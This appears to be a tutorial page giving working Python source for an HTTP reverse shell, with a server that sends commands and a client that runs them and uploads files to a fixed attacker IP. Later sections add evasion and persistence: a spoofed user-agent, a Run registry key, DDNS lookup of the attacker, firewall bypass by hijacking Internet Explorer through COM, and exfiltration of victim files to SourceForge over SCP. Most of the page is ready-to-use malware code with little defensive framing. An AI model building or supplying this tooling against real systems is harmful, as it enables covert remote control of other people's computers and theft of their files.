# HTTP reverse shell

*httpserver.py* :

```python
import http.server
import os, cgi

HOST_NAME = "192.168.1.42"
PORT_NUMBER = 8080

class MyHandler(http.server.BaseHTTPRequestHandler):
    
    def do_GET(self):
        command = input("Shell> ")
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(command.encode()) # equivalent to send() function in tcp reverse shell

    def do_POST(self):
        if self.path == '/store':
            try:
                ctype, pdict = cgi.parse_header(self.headers.get('content-type'))
                if ctype == 'multipart/form-data':
                    fs = cgi.FieldStorage(fp=self.rfile, headers = self.headers, environ={'REQUEST_METHOD': 'POST'})
                else:
                    print('[!!] Unexpected POST request')
                fs_up = fs['file']
                with open('/root/place_holder.txt', 'wb') as o:
                    print("[+] Writing file...")
                    o.write(fs_up.file.read())
                    self.send_response(200)
                    self.end_headers()
            except Exception as e:
                print(e)
            return
        self.send_response(200)
        self.end_headers()
        length = int(self.headers['Content-length'])
        postVar = self.rfile.read(length) # equivalent to recv() function in tcp reverse shell

        print(postVar.decode())

if __name__ == "__main__":
    server_class = http.server.HTTPServer
    httpd = server_class((HOST_NAME, PORT_NUMBER), MyHandler)
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("[ ] Server is terminated")
        httpd.server.close()

```

*httpclient.py* :
```python
import requests
import os
import subprocess
import time

while True:
    req = requests.get('http://192.168.1.42:8080')
    command = req.text
    if 'terminate' in command:
        break
    elif 'grab' in command:
        grab, path = command.split("*")
        if os.path.exists(path):
            url = "http://192.168.1.42:8080/store" # /store means that we are sending a file over http
            files = {'file': open(path, 'rb')} # here we need to pass a dictionnary with a key named "file" and the object is the file itself
            r = requests.post(url, files=files) # be aware that file contain header "multipart/form-data"
    else:
        CMD = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        post_response = requests.post(url='http://192.168.1.42:8080', data=CMD.stdout.read())
        post_response = requests.post(url='http://192.168.1.42:8080', data=CMD.stderr.read())
    time.sleep(3)
```

For now on a POST looks like this in wireshark :<br>
<img src=https://github.com/sirbrowser/astroworld/blob/master/images/wireshark.png><br>
We can see that the user-agent is not legit at all so we need to change it in clienthttp.py:<br>
We add a variable `headers = {'User-Agent': 'mozilla/5.0'}`<br>
And in each we add this variable in all requests.post : `r = requests.post(url, files=files, headers=headers)`<br>

Now we have this in wireshark :<br>
<img src=https://github.com/sirbrowser/astroworld/blob/master/images/wireshark2.png><br>

For making our reverse shell persistent we need to add to the client.py:<br>
```python
path = os.getcwd().strip('\n') # getcwd = get current working directory

Null, userprof = subprocess.check_output('set USERPROFILE', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode().split('=')

destination = userprof.strip('\n\r') + '\\AppData\\' + '\\roaming\\' + 'client.exe'

if not os.path.exists(destination):
    shutil.copyfile(path+'\client.exe', destination)
    key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, wreg.KEY_ALL_ACCESS)
    wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG_SZ, destination)
    key.Close()
```

#### DDNS Aware shell
The problem here is that our attacker ip can change and you have to change the client.py.<br>
For this we can use [noip](https://www.noip.com/) that will reserve a dns server and address dynamically the adress in our client.py:<br>
in the main we need to add :<br>
`ip = socket.gethostbyname("<your ddns.net server>")`<br>
and add that ip variable in the `s.connect(())` function<br>

#### Bypassing Host Firewall
The problem here is if the internal firewall of the target machine as rules that allows internet explorer and chrome for example to have acces to internet and python is blocked, then our script cannot be executable.<br>
The solution here is to hijack Internet Explorer to run our reverse shell over IE, or any other program that is allowed to connect to internet.<br>
With this we are not worried about proxy bypassing, cause IE is normally integrating the administrator proxy.<br>
We need :
`pip install pypiwin32`<br>
`pip install pywin32`<br>
We need to use the COM in windows which stands for [Component Object Model](https://en.wikipedia.org/wiki/Component_Object_Model)<br>
```python
from win32com.client import Dispatch
from time import sleep
import subprocess

ie = Dispatch("InternetExplorer.Application")
ie.Visible = 0 # 0 runs IE in background and 1 opens a IE window

# Parameters for POST
dURL = "http://192.168.1.42"
Flags = 0
TargetFrame = 0

while True:
    ie.Navigate("http://192.168.1.42") #Load a page on the specified url
    while ie.ReadyState != 4: #when a page is loaded ReadyState() return 4 so we check until it is 4
        sleep(1)

    command = ie.Document.body.innerHTML
    command = command.encode()
    print(command.decode())

    if 'terminate' in command.decode():
        ie.Quit()
        break
    else:
        CMD = subprocess.Popen(command.decode(), shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        Data = CMD.stdout.read()
#        print(Data)
        PostData = memoryview( Data ) #we need this because we are using COM
        ie.Navigate(dURL, Flags, TargetFrame, PostData)
#        print(check)
    sleep(3)
```

To bypass General firewall of the company we can use trusted websites. For example we will use [sourceforge](https://sourceforge.net/) so the target will send files to sourceforge over SCP and we will get back the files with FTP and filezilla on our kali so there is not link between the target and us.<br>
We need to create an account on sourceforge<br>
- Then `apt-get install filezilla` --> on kali<br>
- `pip install paramiko`<br>
- `pip install scp`<br>

Then we connect to our sourceforge in filezilla :<br>
<img src=https://github.com/sirbrowser/astroworld/blob/master/images/sourceforge.png><br>

and ou script looks like this :<br>
```python
import paramiko
import scp

ssh_client = paramiko.SSHClient()

ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

ssh_client.connect("web.sourceforge.net", username="<sourceforge_username>", password="<sourceforge_pwd>")
print("[..] Authenticatin on sourceforge...")

scp = scp.SCPClient(ssh_client.get_transport())

scp.put("C:/Users/benja/Desktop/sarah.txt")
print("[+] File uploaded")

scp.close()

```

